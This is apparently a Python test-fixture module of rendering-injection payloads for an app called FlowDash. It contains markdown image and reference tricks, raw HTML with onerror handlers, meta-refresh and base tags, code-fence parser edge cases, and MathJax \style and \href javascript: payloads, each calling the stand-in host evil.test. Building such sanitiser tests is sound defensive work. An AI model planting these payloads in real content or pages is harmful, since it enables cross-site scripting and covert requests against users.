"""Strings that try to turn text shown by FlowDash into markup, requests or script.

Each payload names itself and targets ``https://evil.test/<name>`` so a request can be
traced back to it; raw HTML payloads push their name to ``window.__pwned`` when they run.
"""


def _pwn(name):
    return f"(window.__pwned=window.__pwned||[]).push('{name}')"


def _img(name):
    return f'<img src="https://evil.test/{name}.png" onerror="{_pwn(name)}">'


# Covers the text with a link when MathJax typesets it, so any click lands on it.
_CLICK = r"{\style{display:block;width:3000px;height:3000px}{\text{CLICKME}}}"

PAYLOADS = {
    # Markdown images and links
    "inline_image": "![x](https://evil.test/inline_image.png)",
    "ref_image": "![x][r]\n\n[r]: https://evil.test/ref_image.png",
    "shortcut_ref": "![shortcut_ref]\n\n[shortcut_ref]: https://evil.test/shortcut_ref.png",
    "collapsed_ref": "![collapsed_ref][]\n\n[collapsed_ref]: https://evil.test/collapsed_ref.png",
    "nested_brackets": "![a [b] c](https://evil.test/nested_brackets.png)",
    "escaped_paren": r"![x](https://evil.test/escaped_paren\(.png)",
    "deep_parens": "![x](https://evil.test/deep_parens((a)).png)",
    "escaped_quote_title": '![x](https://evil.test/escaped_quote_title.png "a\\"b")',
    "code_in_alt": "![`]`](https://evil.test/code_in_alt.png)",
    "code_in_dest": "![x](https://evil.test/code_in_dest`a`.png)",
    "angle_dest": "![x](<https://evil.test/angle_dest.png>)",
    "attr_list": "![x](https://evil.test/attr_list.png){: onerror=alert(1)}",
    "footnote": "x[^1]\n\n[^1]: ![x](https://evil.test/footnote.png)",
    "entity_js_link": f"[ENTITYJS](javascript&#58;{_pwn('entity_js_link')})",
    "tab_js_link": f"[TABJS](java&#x09;script:{_pwn('tab_js_link')})",
    "data_html_link": "[DATAHTML](data:text/html,<script>alert(1)</script>)",
    "vbscript_link": "[VB](vbscript:msgbox)",
    "autolink": "<https://evil.test/autolink>",
    "linkify": "see https://evil.test/linkify and www.evil.test/linkify_www",
    "emoji_deflist": "term\n: definition :smile:",
    # Raw HTML, alone and where a code detector might think it is code
    "raw_html": _img("raw_html"),
    "base_meta_link": (
        '<base href="https://evil.test/base/">'
        '<meta http-equiv="refresh" content="0;url=https://evil.test/meta">'
        '<link rel="preload" as="image" href="https://evil.test/preload.png">'
    ),
    "style_attr": '<span style="background:url(https://evil.test/style_attr.png)">x</span>',
    "table_html": "| a |\n|---|\n| " + _img("table_html") + " |",
    "blockquote_html": "> " + _img("blockquote_html"),
    "span_across_paragraphs": f"`a\n\n{_img('span_across_paragraphs')}\n\nb`",
    "escaped_backtick": f"\\` {_img('escaped_backtick')} `",
    "longer_closing_fence": f"```\nx\n````\n{_img('longer_closing_fence')}\n\n```",
    "indented_fence": f"para\n\n    ```\n{_img('indented_fence')}\n```",
    "fence_info_backtick": f"```a`b\n{_img('fence_info_backtick')}\n```",
    "list_fence": f"- item\n\n  ```\n  code\n  ```\n{_img('list_fence')}",
    # MathJax: \style loads URLs from CSS, \href runs javascript: URLs on click
    "dd_style": r"$$\style{background-image:url(https://evil.test/dd_style.png)}{x}$$",
    "dd_href": r"$$\href{javascript:" + _pwn("dd_href") + "}" + _CLICK + "$$",
    "paren_style": r"\(\style{background-image:url(https://evil.test/paren_style.png)}{x}\)",
    "paren_href": r"\(\href{javascript:" + _pwn("paren_href") + "}" + _CLICK + r"\)",
    "bracket_style": r"\[\style{background-image:url(https://evil.test/bracket_style.png)}{x}\]",
    "bracket_href": r"\[\href{javascript:" + _pwn("bracket_href") + "}" + _CLICK + r"\]",
    "env_href": (
        r"\begin{equation}\href{javascript:" + _pwn("env_href") + "}" + _CLICK + r"\end{equation}"
    ),
    "dollar_style": r"$\style{background-image:url(https://evil.test/dollar_style.png)}{x}$",
}

# Everything at once, for surfaces that show one string.
ALL = "\n\n".join(f"{name} {payload}" for name, payload in PAYLOADS.items())
